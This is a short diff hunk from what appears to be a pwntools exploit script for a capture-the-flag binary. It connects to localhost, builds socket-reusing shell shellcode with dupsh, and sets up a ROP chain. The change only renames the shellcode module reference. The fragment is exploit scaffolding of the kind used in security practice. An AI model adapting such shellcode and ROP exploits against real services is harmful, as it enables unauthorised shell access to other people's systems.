@@ -4,7 +4,7 @@ context('i386', 'linux', 'ipv4')
 
 sock = remote('localhost', 32000, timeout = None)
 
-shellcode = asm(shellcodes.dupsh(0))
+shellcode = asm(shellcode.dupsh(0))
 
 rop = ROP('./chal')
 
